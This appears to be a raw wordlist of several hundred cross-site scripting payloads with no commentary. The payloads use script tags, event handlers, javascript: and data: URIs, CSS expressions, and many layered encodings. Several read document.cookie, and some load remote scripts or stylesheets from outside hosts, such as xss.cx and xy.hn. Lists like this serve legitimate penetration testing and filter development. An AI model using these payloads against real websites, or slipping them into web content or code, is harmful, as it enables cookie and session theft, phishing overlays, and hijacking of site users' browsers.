'%26%26'javascript:alert%25281%2529//
document.write("<scr"+"ipt language=javascript src=http://localhost/></scr"+"ipt>");
<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>
12&<script>alert(123)</script>=123
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img src=/ onerror=alert(1)>
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
<img/src="xss.png"alt="xss">
<IMG SRC="mocha:[code]">
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
<STYLE>@import'http://host/css';</STYLE>
<SCRIPT+a=">'>" SRC="http://localhost"></SCRIPT>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
%3Cscript%3Ealert(1)%3C/script%3E
foo%00<script>alert(document.cookie)</script>
"><<script>alert(document.cookie);//<</script>
><s"%2b"cript>alert(document.cookie)</s"%2B"cript>
3Cscript%3Ealert(1)%3C%2Fscript%3E
%253Cscript%253Ealert(1)%253C/script%253E
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
%BCscript%BEalert(%A21%A2)%BC/script%BE
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">ugh</a>
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<a+href="javas&#99;ript&#35;alert(1);">
<IMG+SRC=j&#X41vascript:alert(1)>
<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
<IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000039&#0000041>
%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e
+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
<INPUT+TYPE="checkbox"+onDblClick=confirm(XSS)>
<APPLET+CODE=""+CODEBASE="http://url/xss">
<SCRIPT>alert(String.fromCharCode(88))</SCRIPT>
&lt;script&gt;prompt(&apos;1&apos;)&lt;/script&gt;
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;
&#x74;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;&#x141;&#x154;&#x145;&#x162;&#x164;&#x50;&#x47;&#x170;&#x163;&#x163;&#x47;&#x51;&#x74;&&#x57;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;
"+style%3d"x%3aexpression(alert(1))+
\";alert(1);//
<img src="x:%90" title="onerror=alert(1)//">
"+onmouseover="window.location='http://localhost'
"+onkeypress="prompt(23)"+
"+onfocus="prompt(1)"+
500);alert(1);//
alert(document['cookie'])
with(document)alert(cookie)
";location=location.hash)//#0={};alert(0)
//";alert(String.fromCharCode(88,83,83))
%F6%3Cimg+onmouseover=prompt(/test/)//%F6%3E
"+onDblClick=prompt(123)"+
"+onError=prompt(123)"+
"+onReset=prompt(123)"+
";eval(unescape(location))//#%0Aprompt(0)
<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT>
%'});%0aalert(1);%20//
<script>//>%0Aalert(1);</script>
<IMG+SRC="jav&#x0A;ascript:alert(1);">
<IMG+SRC="jav%0dascript:alert(1);">
<IMG+SRC="jav#x0D;ascript:alert(1);">
<IMG+SRC="jav%09ascript:alert(1);">
<IMG+SRC="jav&#x09;ascript:alert(1);">
%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E
<script%00>alert(1)</script%00>
<scr%00ipt>prompt(1)</sc%00ript>
<scr\0ipt>prompt(1)</sc\0ript>
%00"><script>alert(1)</script>
%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E
<script%0Caaaaa>alert(123)</script>
%3Cscript%0Baaa%3Ealert%281%29%3C/script%0Baaaa%3E
%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E
<*script>prompt(123)<*/script>
<script%0Daaa>alert(1)</script%0Daaaa>
<script%20TEST>alert(1)</script%20TESTTEST>
<SCRIPT/XSSSRC="http://host"></SCRIPT>
<SCRIPT+SRC=http://host/
<<SCRIPT>alert(1);//<</SCRIPT>
< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >
%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e
javascript:propmpt(1)
javascript:eval(unescape(location.href))
a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);
location=location.hash.slice(1);
";location=location.hash)//#0={};alert(0)
location=location.hash
""+{toString:alert}
""+{valueOf:alert}
";eval(unescape(location))//# %0Aalert(0)
";location.href='http://site';//
"><script>alert(1)</script>=1"onPaste="eval(';)\'SSX\'(trela'.split('').reverse().join(''))"
"><link rel="stylesheet" href="http://8ant.org/asdfqwer.css"><"
"onfocusin="top['\x61\x6C\x65\x72\x74']('\x58\x53\x53')"
"onfocusout="parent[String.fromCharCode(500-403,500-392,500-399,500-386,500-384)](String.fromCharCode(300-212,300-217,300-217))"
"onfocus="window['\141\154\145\162\164']('\130\123\123')"
"onKeyDown="&#00112;arent['aleraaaaat'.replace('aaaaa','')]('XaaaaaSaaaaaS'.replace('aaaaa','').replace('aaaaa',''))"
"onDblClick="&#119;indow['aleraaaat'.re&#0112;lace('aaaa','')]('XaaaaSaaaaS'.re&#0112;lace('aaaa','').re&#0112;lace('aaaa',''))"
"onMouseUp="wi&#110dow[Str&#105;ng.fromC&#104;arCode(501-404,501-393,501-400,501-387,501-385)]&#0000040;&#0000039;&#0000088;&#0000083;&#0000083;&#0000039;&#0000041;"
"onMouseEnter="&#000097;&#0000108;&#0000101;&#0000114;&#0000116;&#000040;&#000039;&#000088;&#000083;&#000083;&#000039;&#000041;"
"onMouseDown="&#00097;&#000108;&#000101;&#000114;&#000116;&#00040;&#00039;&#00088;&#00083;&#00083;&#00039;&#00041;"
"onMouseOut="&#0097;&#00108;&#00101;&#00114;&#00116;&#0040;&#0039;&#0088;&#0083;&#0083;&#0039;&#0041;"
"onMouseMove="&#097;&#0108;&#0101;&#0114;&#0116;&#040;&#039;&#088;&#083;&#083;&#039;&#041;"
"onMouseLeave="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
"onContextMenu="&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;&#x000028;&#x000027;&#x000058;&#x000053;&#x000053;&#x000027;&#x000029;"
"onCopy="&#x00061;&#x0006c;&#x00065;&#x00072;&#x00074;&#x00028;&#x00027;&#x00058;&#x00053;&#x00053;&#x00027;&#x00029;"
"onSelect="&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0027;&#x0058;&#x0053;&#x0053;&#x0027;&#x0029;"
"onBlur="&#x061;&#x06c;&#x065;&#x072;&#x074;&#x028;&#x027;&#x058;&#x053;&#x053;&#x027;&#x029;"
"onmouseover="(new	Function('rssseturn(alesssrt)'.&#x73plit('sss').joi&#x6e('')))()(('SXS'+'SXS').slice(-5,4))"
"onclick="alert('XSS')"
"><script src="file:///c:/wonderful.js"></script><"
<script/src=data:,alert()>
<marquee/onstart=alert()>
<video/poster/onerror=alert()>
<isindex/autofocus/onfocus=alert()>
<svg id=alert(1337) onload=eval(id)>
<svg id=javascript:alert(1337) onload=location=id>
<style onload='execScript("InputBox+1","VbScript");'>
<a onhelp='eval(href+"confirm(1)")'contenteditable='true'href='&#32;javascript:'>click</a>
<img language=vbs src=<b onerror=alert#1/1#>
<isindex action="javas&Tab;cript:alert(1)" type=image>
"]<img src=1 onerror=alert(1)>
<input/type="image"/value=""`<span/onmouseover='confirm(1)'>X`</span>
<svg[U+000B]onload=alert(1)>
<iframe/name="javascript:confirm(1);"onload="while(1){eval(name);}">
<cite><a href="javascript:confirm(1);">XSS cited!</a></cite>
<svg/onload=window.onerror=alert;throw/XSS/;//
<video src="x" onloadstart="alert(1)">
<a href="javascript:data:alert(1)">click</a>
<a href="javascript://%0d(0===0&&1==1)%0c?alert(1):confirm(2)">click</a>
<div style='x:anytext/**/xxxx/**/n(alert(1)) ("\"))))))expressio\")'>aa</div>
<%%%>
<meta charset=iso-2022-jp><%1B(Jd%1B(Ji%1B(Jv><i%1B(Jm%1B(Jg s%1B(Jr%1B(Jc%1B(J=%1B(Jx o%1B(Jn%1B(Jer%1B(Jr%1B(Jo%1B(Jr%1B(J=%1B(Ja%1B(Jl%1B(Je%1B(Jr%1B(Jt(1)//%1B(J<%1B(J/%1B(Jd%1B(Jiv%1B(J>%1B(J
<!-- Hello -- world > <SCRIPT>confirm(1)</SCRIPT> -->
<! XSS="><img src=xx:x onerror=confirm(1)//">
"; ||confirm('XSS') || "
<? echo('<SCR)';
"/> <img src='aaa' onerror=confirm(document.domain)>
/> <img src='aaa' onerror=confirm(document.domain)>
<!-- --!><input value="--><body/onload=`confirm(4)//`">
<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)> <a href=javascript*chr*:confirm(*num*)>*num*</a>
//|\\ <script //|\\ src='http://xss.cx/xss.js'> //|\\ </script //|\\
&#0000060
&#0000060;
&#0000062
&#0000062;
&#000060
&#000060;
&#000062
&#000062;
&#00060
&#00060;
&#00062
&#00062;
&#0060
&#0060;
&#0062
&#0062;
&#00;</form><input type&#61;"date" onfocus="confirm(1)">
&#060
&#060;
&#062
&#062;
%2522%253E%253Csvg%2520onload%3D%2522confirm(7)%2522%253E
%253Cs%26%2399%3Bri%26%23112%3Bt%2520s%26%23114%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%253E
%253Cs%26%23x63%3Bri%26%23x70%3Bt%2520s%26%23x72%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%253E
%253Cscript%2520src%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fscript%253E
"%25prompt(9)%25"
"%26%26prompt(9)%26%26"
%26lt%3bscript>
"%26prompt(9)%26"
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
<3 </3
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
%3C
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%2399%3Bri%26%23112%3Bt%2520s%26%23114%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%2399%3Bri%26%23112%3Bt%2520s%26%23114%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%23x63%3Bri%26%23x70%3Bt%2520s%26%23x72%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cs%26%23x63%3Bri%26%23x70%3Bt%2520s%26%23x72%3Bc%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fs%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
%3Cdiv%20style%3Dposition%3Afixed%3Btop%3A0px%3Bleft%3A0px%3Bbackground%2Dcolor%3A%23FFFFFF%3Bwidth%3A100%25%3Bheight%3A100%25%3Btext%2Dalign%3Acenter%3Bz%2Dindex%3A11%3B%20%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Ca%20href%3D%3Fxss%3D%253Cscript%2520src%253D%252F%252Fxy%252Ehn%252Fa%252Ejs%2520%253E%253C%252Fscript%253E%3EThe%20requested%20page%20has%20moved%20here%3C%2Fa%3E%3C%2Fdiv%3E
%3Cs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%20s%26%23114%3B%26%2399%3B%3Dht%26%23116%3Bp%3A%2F%2Fx%26%23116%3Bxs%26%2399%3B.cx%2Fxss%2Ejs%3E%3C%2Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%3E
%3Cs%26%2399%3Bri%26%23112%3Bt%20s%26%23114%3Bc%3D%2F%2Fxy%2Ehn%2Fa%2Ejs%20%3E%3C%2Fs%26%2399%3B%26%23114%3Bi%26%23112%3Bt%3E
%3Cs%26%23x63%3Bri%26%23x70%3Bt%20s%26%23x72%3Bc%3D%2F%2Fxy%2Ehn%2Fa%2Ejs%20%3E%3C%2Fs%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%3E
%3Cs%26%23x63%3Bri%26%23x70%3Bt%20s%26%23x72%3Bc%3Dhttp%3A%2F%2Fxs%26%23s63%3B.cx%2Fxss%2Ejs%3E%3C%2Fs%26%23x63%3Bri%26%23x70%3Bt%3E
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{confirm%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
%3E
[4076*A]<img src="x" alt="[0x8F]" test=" onerror=confirm(1)//">
&#60
&#60;
&#62
&#62;
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<A """><IMG SRC="javascript:confirm(1)">
"'`>ABC<div style="font-family:'foo'*chr*x:expression(log(*num*));/*';">DEF
"'`>ABC<div style="font-family:'foo*chr*;x:expression(log(*num*));/*';">DEF
<A/HREF="javascript:confirm(1)">
<B <SCRIPT>confirm(1)</SCRIPT>>
<BASE HREF="javascript:confirm('XSS');//">
<BGSOUND SRC="javascript:confirm('XSS');">
<BODY BACKGROUND="javascript:confirm('XSS')">
<BODY ONLOAD=confirm('XSS')>
<BR SIZE="&{confirm('XSS')}">
<B="<SCRIPT>confirm(1)</SCRIPT>">
<DIV STYLE="background-image: url(&#1;javascript:confirm(5))">
<DIV STYLE="background-image: url(javascript:confirm(5))">
<DIV STYLE="width: expression(confirm(5));">
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80confirm(1)%E3%B0%80/script%E3%B8%80
<FRAMESET><FRAME RC=""+"javascript:confirm(5);"></FRAMESET>
<FRAMESET><FRAME SRC="javascript:confirm(5);"></FRAMESET>
&GT
&GT;
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-confirm(5);+ADw-/SCRIPT+AD4-
<HTML><BODY>
<IFRAME SRC="javascript:confirm(5);"></IFRAME>
<IFRAME%20src='javascript:confirm%26%23x25;281)'>
<![><IMG ALT="]><SCRIPT>confirm(1)</SCRIPT>">
<IMG ALT="><SCRIPT>confirm(1)</SCRIPT>"(EOF)
<IMG DYNSRC="javascript:confirm(document.location)">
<IMG LOWSRC="javascript:confirm(document.location)">
<IMG SRC=" &#14;  javascript:confirm(document.location);">
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=JaVaScRiPt:confirm(document.location)>
<IMG SRC=JaVaScRiPt:confirm(&quot;XSS<WBR>&quot;)>
<IMG SRC=JaVaScRiPt:prompt(document.location)> 
<IMG SRC="jav	ascript:confirm(document.location);">
<IMG SRC=java%00script:confirm(document.location)>
<IMG SRC=`javascript:confirm(1)`>
<IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))>
<IMG SRC=`javascript:confirm(document.cookie)`>
<IMG SRC="javascript:confirm(document.location)"
<IMG SRC="javascript:confirm(document.location);">
<IMG SRC=javascript:confirm(document.location)>
<IMG SRC=javascript:confirm(&quot;XSS&quot;)>
<IMG SRC=javascript:prompt(document.location)>
<IMG SRC="jav&#x09;ascript:confirm(<WBR>document.location);">
<IMG SRC="jav&#x09;ascript:confirm(document.location);">
<IMG SRC="jav&#x0A;ascript:confirm(<WBR>document.location);">
<IMG SRC="jav&#x0A;ascript:confirm(document.location);">
<IMG SRC="jav&#x0D;ascript:confirm(<WBR>document.location);">
<IMG SRC="jav&#x0D;ascript:confirm(document.location);">
<IMG SRC="livescript:[code]">
<IMG SRC="mocha:[code]">
<IMG SRC='vbscript:msgbox(document.location)'>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG STYLE="xss:expr/*XSS*/ession(confirm(document.location))">
<IMG onmouseover =confirm(1)>
<IMG%0aSRC%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a"%0a>
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
<INPUT TYPE="IMAGE" SRC="javascript:confirm(document.location);">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="http://xss.cx/xss.css">
<LINK REL="stylesheet" HREF="javascript:confirm(document.location);">
&LT
&LT;
<META HTTP-EQUIV="Link" Content="<http://xss.cx/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<javascript:confirm(document.location)>; REL=stylesheet">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;confirm(document.location)&lt;/SCRIPT&gt;">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm(document.location);">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm(document.location);">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.cx/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:confirm(document.location)></OBJECT>
PHNjcmlwdD5hbGVydCgnWFNTIScpPC9zY3JpcHQ+
<S[0x00]CRIPT>confirm(1)</S[0x00]CRIPT>
<SCR%00IPT>confirm(document.location)</SCR%00IPT>
<SCRIPT SRC="http://xss.cx/xss.jpg"></SCRIPT>
<SCRIPT SRC=http://xss.cx/xss.js?<B>
<SCRIPT SRC=http://xss.cx/xss.js></SCRIPT>
<SCRIPT a=">" '' SRC="http://xss.cx/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://xss.cx/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://xss.cx/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://xss.cx/xss.js"></SCRIPT>
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{confirm(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
</SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
<SCRIPT/XSS SRC="http://xss.cx/xss.js"></SCRIPT>
<SCRIPT>a=document.cookie
<SCRIPT>confirm(document.location);</SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.cx/xss.js"></SCRIPT>
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<STYLE TYPE="text/javascript">confirm(document.location);</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:confirm(document.location)")}</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>.XSS{background-image:url("javascript:confirm(document.location)");}</STYLE><A CLASS=XSS></A>
<STYLE>@import'http://xss.cx/xss.css';</STYLE>
"><STYLE>@import"javascript:confirm(document.location)";</STYLE>
<STYLE>@im\port'\ja\vasc\ript:confirm(document.location)';</STYLE>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<TABLE BACKGROUND="javascript:confirm(document.location)">
&#X000003C
&#X000003C;
&#X000003E
&#X000003E;
&#X000003c
&#X000003c;
&#X000003e
&#X000003e;
&#X00003C
&#X00003C;
&#X00003E
&#X00003E;
&#X00003c
&#X00003c;
&#X00003e
&#X00003e;
&#X0003C
&#X0003C;
&#X0003E
&#X0003E;
&#X0003c
&#X0003c;
&#X0003e
&#X0003e;
&#X003C
&#X003C;
&#X003E
&#X003E;
&#X003c
&#X003c;
&#X003e
&#X003e;
&#X03C
&#X03C;
&#X03E
&#X03E;
&#X03c
&#X03c;
&#X03e
&#X03e;
&#X3C
&#X3C;
&#X3E
&#X3E;
&#X3c
&#X3c;
&#X3e
&#X3e;
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a data-remote=true data-method=delete href=/delete_account>CLICK</a>
<a href=````>
<a href="#" onclick="confirm(' &#39&#41&#59&#97&#108&#101&#114&#116&#40&#50 ')">name</a>
<a href='#' onmouseover ="javascript:$('a').html(5)">a link</a>
<a href="// Í¥.ws">CLICK
<a href=[0x0b]" onclick=confirm(1)//">click</a>
<a href="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</a>
<a href=``calc``>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:application/x-x509-user-cert;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<a href="data:text/html,%3cscript>confirm &#40;1&#41;&lt;/script&gt;" >hello
<a href="data:text/html;base64,PHN2Zyè¨9vbmxvæ™•YWQ<>>9YWxlc>>>nQoMSk+">click</a>
"/><a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<a href="data:text/html,<script>eval(name)</script>" target="confirm(1)">click</a>
<a href=``explorer.exe``>
<a href="invalid:1" id=x name=y>test</a>
"/><a href="invalid:2" id=x name=y>test</a>
<a href="j&#00000000000000097vascript:window['confirm'](1)">aa</a>
<a href="jAvAsCrIpT&colon;confirm&lpar;1&rpar;">X</a>
<a href="jAvAsCrIpT&colon;confirm&lpar;1&rpar;">X</a>
<a href="javas&Tab;cri&NewLine;pt:confirm(1)">test</a>
<a href="//javascript:99999999/1?/YOU_MUST_HIT_RETURN<svg onload=confirm(1)>/:0">Right click open in new tab</a>
"/><a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
"><a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
<a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click-XSS</a>
"><a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript:'hello'" rel="sidebar">x</a>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:confirm(1)&NewLine;>X</a>
<a href=javascript&.x3A;confirm&(x28;1&)x29;//=>clickme
a href="j&#x26;#x26#x41;vascript:confirm%252831337%2529">Hello</a>
<a href=``mspaint.exe``>
<a href=``notepad.exe``>
<a href=``shell:System``>
<a href='vbscript:"&#x5c&quot&confirm(1)&#39&#39"'>
<a href="x:confirm(1)" id="test">click</a><script>eval(test+'')</script>
<a href=``xss.cx``>
<a id="x" href='http://adspecs.yahoo.com/adspecs.php' target="close(/*grabcookie(1)*/)">CLICK</a><script>onblur=function(){confirm(4)}x.click();</script>
<a rel="noreferrer" href="//xss.cx">click</a>
<a target=_blank href="data:text/html,<script>confirm(opener.document.body.innerHTML)</script>">clickme in Opera/FF</a>
